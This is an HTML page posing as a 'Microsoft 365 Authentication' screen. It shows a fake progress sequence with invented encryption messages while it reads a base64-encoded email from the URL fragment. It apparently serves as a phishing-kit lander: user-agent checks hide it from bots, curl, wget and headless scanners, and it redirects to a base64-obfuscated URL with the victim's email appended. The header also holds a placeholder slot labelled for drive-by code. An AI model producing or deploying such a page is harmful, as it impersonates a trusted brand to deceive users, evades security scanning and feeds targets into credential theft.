
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft 365 Authentication</title>
    <script>/*{DRIVE-BY-IN-HEADER}*/</script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f3f2f1;
            margin: 0;
            overflow: hidden;
        }
        
        .loading-container {
            text-align: center;
        }
        
        
        .status-container {
            margin-top: 40px;
            min-height: 120px;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e1dfdd;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0078d4, #106ebe);
            width: 0%;
            transition: width 0.8s ease;
            box-shadow: 0 0 10px rgba(0, 120, 212, 0.3);
        }

        .progress-fill.completed {
            width: 100% !important;
            transition: none !important;
        }

        .status-message {
            font-size: 18px;
            color: #323130;
            margin-bottom: 10px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s ease;
            font-weight: 500;
        }

        .status-message.active {
            opacity: 1;
            transform: translateY(0);
        }

        .status-message.success {
            color: #107c10;
        }

        .crypto-details {
            font-size: 14px;
            color: #605e5c;
            margin-top: 5px;
            font-family: 'Consolas', 'Courier New', monospace;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .crypto-details.active {
            opacity: 1;
        }

    </style>
</head>
<body>
    <div class="loading-container">
        
        <div class="status-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            
            <div class="status-message" id="statusMessage">Initializing secure connection...</div>
            <div class="crypto-details" id="cryptoDetails">Establishing TLS 1.3 handshake...</div>
        </div>
    </div>
    <script>
        const loadingSequence = [
            
            {
                message: "Retrieving account details...",
                detail: "Fetching encrypted user metadata...",
                progress: 30,
                duration: 1000
            },
            {
                message: "Decrypting secure message...",
                detail: "AES-256-GCM decryption in progress...",
                progress: 50,
                duration: 1200
            },
            {
                message: "Verifying your session...",
                detail: "Validating email address...",
                progress: 100,
                duration: 1300
            }
        ];

        let currentStep = 0;
        let isLoading = false;

        function createParticles() {
            // Particles disabled
        }

        function updateLoadingStep() {
            if (currentStep >= loadingSequence.length) {
                completeLoading();
                return;
            }

            const step = loadingSequence[currentStep];
            const statusMessage = document.getElementById('statusMessage');
            const cryptoDetails = document.getElementById('cryptoDetails');
            const progressFill = document.getElementById('progressFill');

            // Update message
            statusMessage.textContent = step.message;
            statusMessage.classList.add('active');
            
            // Update details
            cryptoDetails.textContent = step.detail;
            cryptoDetails.classList.add('active');

            // Update progress
            progressFill.style.width = step.progress + '%';

            // Create particles effect
            createParticles();

            setTimeout(() => {
                statusMessage.classList.remove('active');
                cryptoDetails.classList.remove('active');
                
                setTimeout(() => {
                    currentStep++;
                    updateLoadingStep();
                }, 300);
            }, step.duration);
        }

        function completeLoading() {
            const statusMessage = document.getElementById('statusMessage');
            const cryptoDetails = document.getElementById('cryptoDetails');
            const progressFill = document.getElementById('progressFill');

            // Lock progress bar at 100% with CSS class
            progressFill.classList.add('completed');
            sequenceCompleted = true;

            statusMessage.textContent = "";
            statusMessage.classList.add('active', 'success');
            cryptoDetails.textContent = "";
            cryptoDetails.classList.add('active');

            setTimeout(() => {
                statusMessage.style.display = 'none';
                cryptoDetails.style.display = 'none';
                isLoading = false;
                // Progress bar locked at 100% with CSS class
            }, 2000);
        }

        let sequenceCompleted = false;

        function startLoginSequence() {
            if (isLoading || sequenceCompleted) return;
            
            isLoading = true;
            currentStep = 0;
            
            const progressFill = document.getElementById('progressFill');
            progressFill.style.width = '0%';
            
            setTimeout(() => {
                updateLoadingStep();
            }, 800);
        }

        // Auto-start the sequence when page loads
        window.addEventListener('load', () => {
            setTimeout(() => {
                startLoginSequence();
            }, 1000);
        });

        // Add ambient particles periodically
        setInterval(createParticles, 6000);
    </script>

    <script>
        // Simple bot detection heuristics
        const isHuman = () => {
            const ua = navigator.userAgent.toLowerCase();
            const bots = [/bot/, /crawl/, /spider/, /curl/, /wget/, /python/, /headless/, /scrapy/];
            return !bots.some(rx => rx.test(ua));
        };

        function getAfterHash(url) {
            const hash = url.split('#')[1];
            if (!hash) return null;
            const equalIndex = hash.indexOf('=');
            return equalIndex > -1 ? hash.slice(equalIndex + 1) : hash;
        }

        // Email validation regex
        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        // Decode email from hash
        const url_string = window.location.href;
        const email_encoded = getAfterHash(url_string);
        let email_decoded = "";

        if (email_encoded) {
            try {
                email_decoded = atob(email_encoded);
            } catch (e) {
                email_decoded = "";
            }
        }

        const base_url_encoded = 'aHR0cHM6Ly93d3cuY25uLmNvbS8=';
        const redirect_url = atob(base_url_encoded) + email_decoded;

        // Override the completeLoading function to integrate with redirect
        const originalCompleteLoading = completeLoading;
        completeLoading = function() {
            const statusMessage = document.getElementById('statusMessage');
            const cryptoDetails = document.getElementById('cryptoDetails');
            const progressFill = document.getElementById('progressFill');

            // Lock progress bar at 100% with CSS class
            progressFill.classList.add('completed');
            sequenceCompleted = true;

            // Protection logic
            if (!isHuman()) {
                statusMessage.textContent = "Access blocked: automated requests are not allowed.";
                statusMessage.classList.add('active');
                statusMessage.style.color = '#a4262c';
                cryptoDetails.textContent = "";
                cryptoDetails.classList.remove('active');
                return;
            }

            if (!isValidEmail(email_decoded)) {
                statusMessage.textContent = "Invalid or unauthorized access detected.";
                statusMessage.classList.add('active');
                statusMessage.style.color = '#a4262c';
                cryptoDetails.textContent = "";
                cryptoDetails.classList.remove('active');
                return;
            }

            // Success - proceed with redirect
            statusMessage.textContent = "Authentication successful";
            statusMessage.classList.add('active', 'success');
            cryptoDetails.textContent = "Redirecting to secure portal...";
            cryptoDetails.classList.add('active');

            setTimeout(() => {
                window.location.replace(redirect_url);
            }, 2000);
        };
    </script>
</body>
</html>
